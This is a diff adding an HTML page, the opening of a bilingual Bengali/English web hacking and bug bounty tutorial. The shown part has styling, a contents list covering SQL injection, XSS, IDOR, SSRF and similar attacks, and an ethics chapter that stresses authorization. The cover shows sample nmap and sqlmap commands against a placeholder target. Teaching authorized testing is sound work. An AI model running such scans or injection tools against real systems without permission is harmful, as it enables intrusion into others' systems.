@@ -1,0 +1,1790 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Hacking & Bug Bounty — সম্পূর্ণ গাইড (Zero to Hunter)</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0a1628;
+    --secondary: #0d2137;
+    --accent: #e63946;
+    --green: #2dc653;
+    --yellow: #ffd60a;
+    --blue: #00b4d8;
+    --purple: #9b5de5;
+    --orange: #f77f00;
+    --teal: #06d6a0;
+    --code-bg: #080f1a;
+    --code-border: #1a3a5c;
+    --text: #0a1628;
+    --bg: #eef2f7;
+    --card: #ffffff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Hind Siliguri', 'Noto Sans Bengali', sans-serif;
+    background: var(--bg); color: var(--text);
+    font-size: 14.5px; line-height: 1.9;
+  }
+
+  /* ═══ COVER ═══ */
+  .cover {
+    background: linear-gradient(135deg, #0a1628 0%, #0d2137 45%, #050d1a 100%);
+    color: white; min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    text-align: center; padding: 60px 40px;
+    page-break-after: always; position: relative; overflow: hidden;
+  }
+  .cover::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(
+      90deg, transparent, transparent 60px,
+      rgba(0,180,216,0.03) 60px, rgba(0,180,216,0.03) 61px
+    ),
+    repeating-linear-gradient(
+      0deg, transparent, transparent 60px,
+      rgba(0,180,216,0.03) 60px, rgba(0,180,216,0.03) 61px
+    );
+  }
+  .cover::after {
+    content: '🕷️';
+    position: absolute; font-size: 260px; opacity: 0.04;
+    bottom: -20px; right: -20px; line-height: 1;
+  }
+  .cover-icon { font-size: 90px; margin-bottom: 15px; position: relative; animation: pulse 2s ease-in-out infinite; }
+  @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+  .cover h1 { font-size: 44px; font-weight: 700; color: var(--teal); text-shadow: 0 0 40px rgba(6,214,160,0.5); position: relative; }
+  .cover h2 { font-size: 21px; font-weight: 400; opacity: 0.75; margin: 10px 0 20px; }
+  .cover .divider { width: 120px; height: 3px; background: linear-gradient(90deg, var(--blue), var(--teal)); margin: 20px auto; border-radius: 2px; }
+  .cover .desc { font-size: 16px; opacity: 0.7; max-width: 660px; line-height: 2.1; position: relative; }
+  .cover .badges { margin-top: 28px; position: relative; }
+  .cover .badge-cv {
+    display: inline-block; background: rgba(6,214,160,0.12);
+    border: 1px solid rgba(6,214,160,0.3); padding: 6px 18px;
+    border-radius: 20px; margin: 5px; font-size: 13px; color: #a8dadc;
+  }
+  .cover .terminal {
+    background: rgba(0,0,0,0.65); border: 1px solid rgba(6,214,160,0.3);
+    border-radius: 10px; padding: 20px 30px; margin-top: 28px;
+    font-family: 'JetBrains Mono', monospace; font-size: 13px;
+    color: var(--teal); text-align: left; max-width: 480px; position: relative;
+  }
+  .cover .terminal .dot { display: inline-block; width:10px; height:10px; border-radius:50%; margin-right:5px; }
+  .cover .terminal .bar { background: #1a2a3a; border-radius:6px 6px 0 0; padding:8px 14px; margin: -20px -30px 14px; display:flex; gap:6px; align-items:center; }
+
+  /* ═══ TOC ═══ */
+  .toc { background: white; padding: 50px 60px; page-break-after: always; }
+  .toc-header { font-size: 30px; color: var(--primary); border-bottom: 4px solid var(--teal); padding-bottom: 15px; margin-bottom: 35px; }
+  .toc-chapter { margin-bottom: 4px; }
+  .toc-main { display: flex; justify-content: space-between; padding: 10px 0; font-weight: 700; font-size: 16px; color: var(--primary); border-bottom: 1px solid #eee; margin-top: 14px; }
+  .toc-main .num { color: var(--teal); margin-right: 10px; }
+  .toc-sub { display: flex; justify-content: space-between; padding: 5px 0 5px 30px; color: #666; font-size: 13.5px; border-bottom: 1px dotted #f0f0f0; }
+
+  /* ═══ CHAPTERS ═══ */
+  .chapter { background: white; margin: 0; page-break-before: always; }
+  .chapter-header { padding: 40px 55px; position: relative; overflow: hidden; }
+  .ch1  .chapter-header { background: linear-gradient(135deg, #0a1628, #0d2137); }
+  .ch2  .chapter-header { background: linear-gradient(135deg, #001a2c, #00304d); }
+  .ch3  .chapter-header { background: linear-gradient(135deg, #0d1117, #1a2332); }
+  .ch4  .chapter-header { background: linear-gradient(135deg, #0a1a0a, #1a3d1a); }
+  .ch5  .chapter-header { background: linear-gradient(135deg, #1a0a00, #4a1f00); }
+  .ch6  .chapter-header { background: linear-gradient(135deg, #1a0000, #4a0000); }
+  .ch7  .chapter-header { background: linear-gradient(135deg, #0a001a, #280050); }
+  .ch8  .chapter-header { background: linear-gradient(135deg, #001a14, #003d2d); }
+  .ch9  .chapter-header { background: linear-gradient(135deg, #1a1200, #4a3300); }
+  .ch10 .chapter-header { background: linear-gradient(135deg, #0d0a1a, #1e1550); }
+  .ch11 .chapter-header { background: linear-gradient(135deg, #0a1a00, #254a00); }
+  .ch12 .chapter-header { background: linear-gradient(135deg, #1a0a0a, #4a1414); }
+  .ch13 .chapter-header { background: linear-gradient(135deg, #000d1a, #002040); }
+
+  .chapter-header::after {
+    content: ''; position: absolute; top: -40px; right: -40px;
+    width: 160px; height: 160px; border-radius: 50%;
+    background: rgba(255,255,255,0.03);
+  }
+  .chapter-label { font-size: 11px; letter-spacing: 4px; color: var(--teal); text-transform: uppercase; margin-bottom: 10px; }
+  .chapter-title { font-size: 30px; color: white; font-weight: 700; }
+  .chapter-desc { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 8px; }
+  .chapter-body { padding: 40px 55px; }
+
+  /* ═══ HEADINGS ═══ */
+  h2.sec { font-size: 22px; color: var(--primary); margin: 35px 0 15px; padding-left: 18px; border-left: 5px solid var(--teal); }
+  h3.sub { font-size: 17px; color: #0d2137; margin: 25px 0 12px; padding-bottom: 6px; border-bottom: 2px dashed #d0e8f0; }
+  h4.mini { font-size: 15px; color: #333; margin: 18px 0 8px; font-weight: 600; }
+  p { margin-bottom: 14px; text-align: justify; }
+
+  /* ═══ CODE ═══ */
+  .code {
+    background: var(--code-bg); color: #cdd6f4;
+    padding: 20px 25px; border-radius: 10px;
+    font-family: 'JetBrains Mono', monospace; font-size: 13px;
+    margin: 18px 0; line-height: 1.85; overflow-x: auto;
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--teal);
+  }
+  .code .c  { color: #4a6a8a; font-style: italic; }
+  .code .k  { color: #cba6f7; }
+  .code .s  { color: #a6e3a1; }
+  .code .n  { color: #fab387; }
+  .code .p  { color: var(--teal); }
+  .code .g  { color: var(--green); }
+  .code .r  { color: #f38ba8; }
+  .code .y  { color: #f9e2af; }
+  .code .b  { color: #89b4fa; }
+  .code .m  { color: #89dceb; }
+  .code .url { color: #f9e2af; text-decoration: underline; }
+  code { background: #1a3a5c; color: #89dceb; padding: 2px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 13px; }
+
+  /* ═══ OUTPUT ═══ */
+  .output {
+    background: #050d1a; border: 1px solid #1a3a5c; border-left: 4px solid var(--green);
+    border-radius: 0 0 10px 10px; margin-top: -18px; padding: 14px 25px;
+    font-family: 'JetBrains Mono', monospace; font-size: 13px; color: #a6e3a1; line-height: 1.8;
+  }
+  .output-label { font-size: 11px; color: #4a6a8a; letter-spacing: 2px; margin-bottom: 5px; }
+
+  /* ═══ HTTP BOX ═══ */
+  .http-box {
+    background: #050d1a; border: 1px solid #1a3a5c; border-radius: 10px;
+    padding: 20px 25px; margin: 18px 0; font-family: 'JetBrains Mono', monospace;
+    font-size: 13px; line-height: 1.8; overflow-x: auto;
+  }
+  .http-method { color: #f38ba8; font-weight: 700; }
+  .http-path   { color: #f9e2af; }
+  .http-ver    { color: #89b4fa; }
+  .http-header { color: #cba6f7; }
+  .http-value  { color: #a6e3a1; }
+  .http-body   { color: #cdd6f4; }
+  .http-status-ok  { color: #a6e3a1; font-weight:700; }
+  .http-status-err { color: #f38ba8; font-weight:700; }
+
+  /* ═══ BOXES ═══ */
+  .box { padding: 18px 22px; border-radius: 10px; margin: 20px 0; border-left: 5px solid; }
+  .info    { background: #e3f4fa; border-color: var(--blue); color: #023e5a; }
+  .warn    { background: #fff8e6; border-color: var(--orange); color: #7b3f00; }
+  .danger  { background: #fde8ea; border-color: var(--accent); color: #9b1d20; }
+  .success { background: #e3faf0; border-color: var(--teal); color: #0a3a28; }
+  .purple-box { background: #f3e8ff; border-color: var(--purple); color: #4a0072; }
+  .yellow-box { background: #fffbeb; border-color: var(--yellow); color: #6b4f00; }
+  .box-t { font-weight: 700; margin-bottom: 8px; font-size: 15px; }
+
+  /* ═══ TABLES ═══ */
+  table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 13.5px; }
+  thead tr { background: var(--primary); color: white; }
+  th { padding: 12px 15px; text-align: left; font-weight: 600; }
+  td { padding: 10px 15px; border-bottom: 1px solid #e4eef5; }
+  tr:nth-child(even) { background: #f0f7fb; }
+  tr:hover { background: #ddf0f5; }
+
+  /* ═══ DIAGRAM ═══ */
+  .diagram {
+    background: #080f1a; border: 1px solid #1a3a5c;
+    border-radius: 10px; padding: 22px; font-family: 'JetBrains Mono', monospace;
+    font-size: 13px; line-height: 1.9; margin: 20px 0; color: #cdd6f4; overflow-x: auto;
+  }
+  .diagram .dg { color: var(--teal); }
+  .diagram .dy { color: var(--yellow); }
+  .diagram .db { color: var(--blue); }
+  .diagram .dr { color: #f38ba8; }
+  .diagram .dp { color: #cba6f7; }
+  .diagram .do { color: var(--orange); }
+
+  /* ═══ GRID ═══ */
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin: 20px 0; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 20px 0; }
+  .card { background: #f0f7fb; border: 1px solid #c8e6f0; border-radius: 10px; padding: 18px; }
+  .card h4 { color: var(--primary); margin-bottom: 10px; font-size: 15px; border-bottom: 2px solid var(--teal); padding-bottom: 6px; }
+  .card.danger-card { border-color: var(--accent); background: #fdf0f1; }
+  .card.danger-card h4 { color: var(--accent); border-color: var(--accent); }
+  .card.success-card { border-color: var(--teal); background: #eafaf4; }
+  .card.success-card h4 { color: #0a3a28; border-color: var(--teal); }
+  .card.orange-card { border-color: var(--orange); background: #fff5e6; }
+  .card.orange-card h4 { color: #7b3f00; border-color: var(--orange); }
+  .card.purple-card { border-color: var(--purple); background: #f5eeff; }
+  .card.purple-card h4 { color: var(--purple); border-color: var(--purple); }
+
+  /* ═══ BADGE ═══ */
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; margin: 2px; }
+  .badge-g { background: #d1fae5; color: #064e3b; }
+  .badge-r { background: #fde8ea; color: #c1121f; }
+  .badge-y { background: #fef9c3; color: #713f12; }
+  .badge-b { background: #e0f2fe; color: #0c4a6e; }
+  .badge-p { background: #f3e8ff; color: #6b21a8; }
+  .badge-o { background: #ffedd5; color: #9a3412; }
+
+  /* ═══ SEVERITY ═══ */
+  .sev { display: inline-block; padding: 4px 12px; border-radius: 6px; font-size: 12px; font-weight: 700; }
+  .sev-critical { background: #450a0a; color: #fca5a5; border: 1px solid #991b1b; }
+  .sev-high     { background: #431407; color: #fdba74; border: 1px solid #c2410c; }
+  .sev-medium   { background: #422006; color: #fcd34d; border: 1px solid #b45309; }
+  .sev-low      { background: #052e16; color: #86efac; border: 1px solid #166534; }
+  .sev-info     { background: #0c1a3d; color: #93c5fd; border: 1px solid #1d4ed8; }
+
+  /* ═══ VULN CARD ═══ */
+  .vuln-card {
+    border: 1px solid #1a3a5c; border-radius: 10px; margin: 18px 0; overflow: hidden;
+  }
+  .vuln-header {
+    background: linear-gradient(135deg, #0a1628, #0d2137);
+    padding: 14px 20px; display: flex; align-items: center; gap: 12px;
+  }
+  .vuln-header h4 { color: white; font-size: 16px; margin: 0; flex:1; }
+  .vuln-body { padding: 18px 20px; background: #f8fcff; }
+  body.dark-mode .vuln-body { background: #0d1a2a; }
+
+  /* ═══ HIGHLIGHT ═══ */
+  .hl { background: linear-gradient(135deg, #e3faf0, #d0f5e8); border: 1px solid var(--teal); padding: 15px 20px; border-radius: 8px; margin: 18px 0; }
+  .chapter-summary { background: linear-gradient(135deg, #0a1628, #0d2137); color: white; border-radius: 12px; padding: 25px 30px; margin-top: 40px; }
+  .chapter-summary h3 { color: var(--teal); margin-bottom: 15px; font-size: 18px; }
+  .chapter-summary li { color: rgba(255,255,255,0.85); margin-bottom: 6px; }
+
+  ul, ol { margin: 12px 0 12px 25px; line-height: 2.1; }
+  li { margin-bottom: 4px; }
+
+  /* ═══ STEP ═══ */
+  .step { display: flex; gap: 16px; margin: 14px 0; align-items: flex-start; }
+  .step-num { min-width: 38px; height: 38px; border-radius: 50%; background: var(--teal); color: #0a1628; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 16px; flex-shrink: 0; }
+  .step-body { flex: 1; padding-top: 5px; }
+
+  /* ═══ ROADMAP ═══ */
+  .roadmap-phase { display: flex; gap: 20px; margin-bottom: 28px; align-items: flex-start; }
+  .phase-number { min-width: 52px; height: 52px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 800; color: white; flex-shrink: 0; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+  .phase-content { flex: 1; }
+  .phase-title { font-size: 17px; font-weight: 700; margin-bottom: 6px; }
+  .phase-items { display: flex; flex-wrap: wrap; gap: 8px; }
+  .phase-item { padding: 5px 14px; border-radius: 20px; font-size: 12.5px; font-weight: 600; }
+
+  /* ═══ PRINT ═══ */
+  @media print {
+    .print-btn, .top-controls { display: none !important; }
+    body { background: white; }
+    .chapter { margin: 0; }
+    .cover, .chapter-header, thead tr { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .code, .diagram, .output, .http-box { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  }
+
+  /* ═══ DARK MODE ═══ */
+  body.light-mode {
+    --bg: #eef2f7; --card: #ffffff; --text: #0a1628;
+    --code-bg: #080f1a; --code-border: #1a3a5c;
+    --toc-bg: #ffffff; --ch-body-bg: #ffffff;
+  }
+  body.dark-mode {
+    --bg: #050d18; --card: #0a1628; --text: #c8d8e8;
+    --code-bg: #030810; --code-border: #1a3a5c;
+    --toc-bg: #0a1628; --ch-body-bg: #0a1628;
+  }
+  body { background: var(--bg); color: var(--text); transition: background 0.3s, color 0.3s; }
+  body.dark-mode .toc { background: var(--toc-bg); color: var(--text); }
+  body.dark-mode .chapter { background: var(--ch-body-bg); }
+  body.dark-mode .chapter-body { background: var(--ch-body-bg); }
+  body.dark-mode h2.sec { color: #7ae8d5; }
+  body.dark-mode h3.sub { color: #6ac8e0; border-color: #1a3a5c; }
+  body.dark-mode p { color: var(--text); }
+  body.dark-mode .toc-main { color: #c8d8e8; border-color: #1a3a5c; }
+  body.dark-mode .toc-header { color: #c8d8e8; }
+  body.dark-mode .toc-sub { color: #6a8aa8; }
+  body.dark-mode table { color: var(--text); }
+  body.dark-mode td { border-color: #1a3a5c; color: var(--text); }
+  body.dark-mode tr:nth-child(even) { background: #0d1e2e; }
+  body.dark-mode tr:hover { background: #102030; }
+  body.dark-mode .card { background: #0d1e2e; border-color: #1a3a5c; color: var(--text); }
+  body.dark-mode .card h4 { color: #7ae8d5; }
+  body.dark-mode .info { background: #071828; color: #7ae8d5; }
+  body.dark-mode .warn { background: #1a0f00; color: #fbbf24; }
+  body.dark-mode .danger { background: #1a0505; color: #fc8181; }
+  body.dark-mode .success { background: #041410; color: #6ee7b7; }
+  body.dark-mode .purple-box { background: #0f0520; color: #d8b4fe; }
+  body.dark-mode .yellow-box { background: #141000; color: #fcd34d; }
+  body.dark-mode .hl { background: #041410; border-color: #0a3a28; color: #6ee7b7; }
+  body.dark-mode code { background: #1a3a5c; color: #89dceb; }
+  body.dark-mode .vuln-body { background: #0d1a2a; }
+
+  /* ═══ BILINGUAL ═══ */
+  .en-text { display: none; }
+  .bn-text { display: inline; }
+  body.lang-en .bn-text { display: none; }
+  body.lang-en .en-text { display: inline; }
+  .en-block { display: none; }
+  .bn-block { display: block; }
+  body.lang-en .bn-block { display: none; }
+  body.lang-en .en-block { display: block; }
+
+  /* ═══ CONTROLS ═══ */
+  .top-controls { position: fixed; top: 20px; right: 20px; display: flex; gap: 10px; z-index: 9999; align-items: center; }
+  .ctrl-btn { border: none; padding: 10px 18px; border-radius: 8px; font-size: 14px; font-family: inherit; cursor: pointer; transition: all 0.3s; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+  .lang-btn { background: var(--blue); color: white; }
+  .lang-btn:hover { transform: translateY(-2px); }
+  .theme-btn { background: var(--teal); color: #0a1628; }
+  .theme-btn:hover { transform: translateY(-2px); }
+  .print-btn { background: var(--accent); color: white; border: none; padding: 10px 18px; border-radius: 8px; font-size: 14px; font-family: inherit; cursor: pointer; transition: all 0.3s; font-weight: 600; }
+  .print-btn:hover { transform: translateY(-2px); }
+
+  .page-footer { text-align:center; margin-top:50px; padding:30px; background: linear-gradient(135deg,#0a1628,#0d2137); border-radius:12px; color:rgba(255,255,255,0.75); }
+  .page-footer p.quote { font-size:17px; color:var(--teal); margin-bottom:10px; }
+</style>
+</head>
+<body class="light-mode">
+
+<div class="top-controls">
+  <button class="ctrl-btn lang-btn" id="langBtn" onclick="toggleLang()">🇬🇧 English</button>
+  <button class="ctrl-btn theme-btn" id="themeBtn" onclick="toggleTheme()">🌙 Dark Mode</button>
+  <button class="print-btn" onclick="window.print()">🖨️ Print / PDF</button>
+</div>
+
+<!-- ═══════ COVER ═══════ -->
+<div class="cover">
+  <div class="cover-icon">🕷️</div>
+  <h1>Web Hacking & Bug Bounty</h1>
+  <h2><span class="bn-text">সম্পূর্ণ গাইড — Zero থেকে Hunter পর্যন্ত</span><span class="en-text">Complete Guide — Zero to Hunter</span></h2>
+  <div class="divider"></div>
+  <p class="desc">
+    <span class="bn-text">ওয়েব অ্যাপ্লিকেশন কিভাবে কাজ করে সেটা জানো না? কোনো সমস্যা নেই। এই গাইড তোমাকে HTTP থেকে শুরু করে OWASP Top 10, Burp Suite ব্যবহার এবং Bug Bounty Report লেখা পর্যন্ত সব শেখাবে।</span>
+    <span class="en-text">Don't know how web apps work? No problem. This guide takes you from HTTP all the way to OWASP Top 10, using Burp Suite, and writing Bug Bounty reports.</span>
+  </p>
+  <div class="badges">
+    <span class="badge-cv">⚠️ শুধু Authorized টার্গেটে</span>
+    <span class="badge-cv">📖 13 Chapters</span>
+    <span class="badge-cv">🕷️ OWASP Top 10</span>
+    <span class="badge-cv">🌙 Dark Mode</span>
+    <span class="badge-cv">🇧🇩 বাংলা / 🇬🇧 English</span>
+  </div>
+  <div class="terminal">
+    <div class="bar">
+      <span class="dot" style="background:#ff5f57;"></span>
+      <span class="dot" style="background:#febc2e;"></span>
+      <span class="dot" style="background:#28c840;"></span>
+      <span style="color:#6a8aa8; font-size:11px; margin-left:8px;">terminal</span>
+    </div>
+    <div><span class="p">$</span> <span class="y">whoami</span></div>
+    <div style="color:#cdd6f4;">ethical_hacker</div>
+    <div style="margin-top:6px;"><span class="p">$</span> <span class="y">nmap</span> -sV target.com</div>
+    <div style="color:#a6e3a1;">Starting Nmap scan...</div>
+    <div style="margin-top:6px;"><span class="p">$</span> <span class="y">sqlmap</span> -u "http://target.com?id=1"</div>
+    <div style="color:#f38ba8;">⚠ Only on authorized targets!</div>
+  </div>
+</div>
+
+<!-- ═══════ TOC ═══════ -->
+<div class="toc">
+  <div class="toc-header">📋 <span class="bn-text">সূচিপত্র</span><span class="en-text">Table of Contents</span></div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">01</span><span class="bn-text">Web Hacking পরিচিতি ও নৈতিকতা</span><span class="en-text">Web Hacking Intro & Ethics</span></span><span>Ch. 1</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Ethical Hacking কী, আইনি সীমা, Bug Bounty কী</span><span class="en-text">What is ethical hacking, legal limits, what is Bug Bounty</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">02</span><span class="bn-text">HTTP ও ওয়েব কিভাবে কাজ করে</span><span class="en-text">HTTP & How the Web Works</span></span><span>Ch. 2</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Request, Response, Headers, Cookies, Sessions</span><span class="en-text">Request, Response, Headers, Cookies, Sessions</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">03</span><span class="bn-text">Tools Setup — Burp Suite, Kali, Recon</span><span class="en-text">Tools Setup — Burp Suite, Kali, Recon</span></span><span>Ch. 3</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Burp Suite, Kali Linux, ffuf, nmap সেটআপ</span><span class="en-text">Setting up Burp Suite, Kali Linux, ffuf, nmap</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">04</span><span class="bn-text">Reconnaissance — তথ্য সংগ্রহ</span><span class="en-text">Reconnaissance — Information Gathering</span></span><span>Ch. 4</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Passive & Active Recon, subdomain enumeration, Google Dork</span><span class="en-text">Passive & Active Recon, subdomain enumeration, Google Dork</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">05</span><span class="bn-text">SQL Injection (SQLi)</span><span class="en-text">SQL Injection (SQLi)</span></span><span>Ch. 5</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Database ভাঙা — সবচেয়ে বিপজ্জনক vulnerability</span><span class="en-text">Breaking databases — the most dangerous vulnerability</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">06</span><span class="bn-text">Cross-Site Scripting (XSS)</span><span class="en-text">Cross-Site Scripting (XSS)</span></span><span>Ch. 6</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Reflected, Stored, DOM — JavaScript inject করা</span><span class="en-text">Reflected, Stored, DOM — injecting JavaScript</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">07</span><span class="bn-text">Broken Authentication & IDOR</span><span class="en-text">Broken Authentication & IDOR</span></span><span>Ch. 7</span></div>
+    <div class="toc-sub"><span><span class="bn-text">লগইন bypass, IDOR দিয়ে অন্যের ডেটা দেখা</span><span class="en-text">Login bypass, viewing others' data via IDOR</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">08</span><span class="bn-text">CSRF, SSRF ও Clickjacking</span><span class="en-text">CSRF, SSRF & Clickjacking</span></span><span>Ch. 8</span></div>
+    <div class="toc-sub"><span><span class="bn-text">ব্যবহারকারীকে ফাঁদে ফেলা — request forgery</span><span class="en-text">Trapping the user — request forgery</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">09</span><span class="bn-text">File Upload ও Path Traversal</span><span class="en-text">File Upload & Path Traversal</span></span><span>Ch. 9</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Malicious file upload, directory traversal দিয়ে ফাইল পড়া</span><span class="en-text">Malicious file upload, reading files via directory traversal</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">10</span><span class="bn-text">Business Logic Bugs</span><span class="en-text">Business Logic Bugs</span></span><span>Ch. 10</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Scanner ধরতে পারে না এমন বাগ — price manipulation, race condition</span><span class="en-text">Bugs scanners can't find — price manipulation, race condition</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">11</span><span class="bn-text">Burp Suite — Deep Dive</span><span class="en-text">Burp Suite — Deep Dive</span></span><span>Ch. 11</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Proxy, Scanner, Intruder, Repeater, Decoder বিস্তারিত</span><span class="en-text">Proxy, Scanner, Intruder, Repeater, Decoder in detail</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">12</span><span class="bn-text">Bug Bounty — শুরু থেকে Report পর্যন্ত</span><span class="en-text">Bug Bounty — From Start to Report</span></span><span>Ch. 12</span></div>
+    <div class="toc-sub"><span><span class="bn-text">HackerOne, Bugcrowd, scope, report লেখা, CVSS score</span><span class="en-text">HackerOne, Bugcrowd, scope, writing reports, CVSS score</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">13</span><span class="bn-text">Practice Lab ও Roadmap</span><span class="en-text">Practice Labs & Roadmap</span></span><span>Ch. 13</span></div>
+    <div class="toc-sub"><span><span class="bn-text">DVWA, PortSwigger, TryHackMe, HackTheBox — কোথায় প্র্যাকটিস করবো</span><span class="en-text">DVWA, PortSwigger, TryHackMe, HackTheBox — where to practice</span></span></div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 1: Intro & Ethics
+══════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title">⚖️ <span class="bn-text">Web Hacking পরিচিতি ও নৈতিকতা</span><span class="en-text">Web Hacking Introduction & Ethics</span></div>
+    <div class="chapter-desc"><span class="bn-text">Ethical Hacking কী, আইনি সীমা, Bug Bounty কী এবং কেন শিখবো</span><span class="en-text">What is ethical hacking, legal limits, what is Bug Bounty and why learn</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🤔 <span class="bn-text">Hacking মানেই কি খারাপ?</span><span class="en-text">Is Hacking Always Bad?</span></h2>
+    <p><span class="bn-text">না! Hacking আসলে <strong>দক্ষতার সাথে সিস্টেম বোঝা এবং পরীক্ষা করা</strong>। Hacking তিন ধরনের:</span><span class="en-text">No! Hacking is actually about <strong>understanding and testing systems skillfully</strong>. There are three types of hacking:</span></p>
+
+    <div class="grid3">
+      <div class="card success-card">
+        <h4>🟢 White Hat</h4>
+        <p><span class="bn-text">Ethical Hacker। অনুমতি নিয়ে সিস্টেম পরীক্ষা করে এবং বাগ রিপোর্ট করে। <strong>Bug Bounty Hunter = White Hat।</strong></span><span class="en-text">Ethical Hacker. Tests systems with permission and reports bugs. <strong>Bug Bounty Hunter = White Hat.</strong></span></p>
+      </div>
+      <div class="card orange-card">
+        <h4>🟡 Grey Hat</h4>
+        <p><span class="bn-text">অনুমতি ছাড়া পরীক্ষা করে, কিন্তু ক্ষতি করে না। সিস্টেম মালিককে জানায়। আইনত ঝুঁকিপূর্ণ।</span><span class="en-text">Tests without permission but doesn't cause damage. Notifies the owner. Legally risky.</span></p>
+      </div>
+      <div class="card danger-card">
+        <h4>🔴 Black Hat</h4>
+        <p><span class="bn-text">অনুমতি ছাড়া সিস্টেমে ঢোকে এবং ক্ষতি করে বা চুরি করে। এটা <strong>অপরাধ — জেল হতে পারে।</strong></span><span class="en-text">Accesses systems without permission and causes harm or steals. This is a <strong>crime — you can go to jail.</strong></span></p>
+      </div>
+    </div>
+
+    <div class="box danger">
+      <div class="box-t">⚖️ <span class="bn-text">বাংলাদেশে আইন — ডিজিটাল নিরাপত্তা আইন ২০১৮</span><span class="en-text">Law in Bangladesh — Digital Security Act 2018</span></div>
+      <span class="bn-text">অনুমতি ছাড়া কারো সিস্টেমে প্রবেশ করলে <strong>সর্বোচ্চ ১৪ বছরের কারাদণ্ড</strong> এবং কোটি টাকার জরিমানা হতে পারে। সবসময় authorized target-এ practice করো।</span>
+      <span class="en-text">Unauthorized access to someone's system can result in <strong>up to 14 years imprisonment</strong> and massive fines. Always practice on authorized targets.</span>
+    </div>
+
+    <h2 class="sec">💰 <span class="bn-text">Bug Bounty কী?</span><span class="en-text">What is Bug Bounty?</span></h2>
+    <p><span class="bn-text">বড় বড় কোম্পানি (Google, Facebook, Microsoft) তাদের সিস্টেমের দুর্বলতা খুঁজে বের করার জন্য Ethical Hacker-দের <strong>পুরস্কার (Bounty)</strong> দেয়। এটাই Bug Bounty।</span><span class="en-text">Big companies (Google, Facebook, Microsoft) pay <strong>rewards (Bounty)</strong> to ethical hackers for finding vulnerabilities in their systems. This is Bug Bounty.</span></p>
+
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>💵 <span class="bn-text">কত টাকা পাওয়া যায়?</span><span class="en-text">How Much Can You Earn?</span></h4>
+        <table style="margin:0;">
+          <thead><tr><th>Severity</th><th>Reward</th></tr></thead>
+          <tbody>
+            <tr><td><span class="sev sev-critical">Critical</span></td><td>$5,000 – $100,000+</td></tr>
+            <tr><td><span class="sev sev-high">High</span></td><td>$1,000 – $10,000</td></tr>
+            <tr><td><span class="sev sev-medium">Medium</span></td><td>$250 – $1,000</td></tr>
+            <tr><td><span class="sev sev-low">Low</span></td><td>$50 – $500</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card purple-card">
+        <h4>🏆 <span class="bn-text">জনপ্রিয় Platform</span><span class="en-text">Popular Platforms</span></h4>
+        <ul>
+          <li>🔴 <strong>HackerOne</strong> — hackerone.com</li>
+          <li>🟠 <strong>Bugcrowd</strong> — bugcrowd.com</li>
+          <li>🔵 <strong>Intigriti</strong> — intigriti.com</li>
+          <li>🟢 <strong>Synack</strong> — synack.com</li>
+          <li>🟡 <strong>YesWeHack</strong> — yeswehack.com</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">📋 <span class="bn-text">Bug Bounty-র নিয়ম</span><span class="en-text">Bug Bounty Rules</span></h2>
+    <div class="box warn">
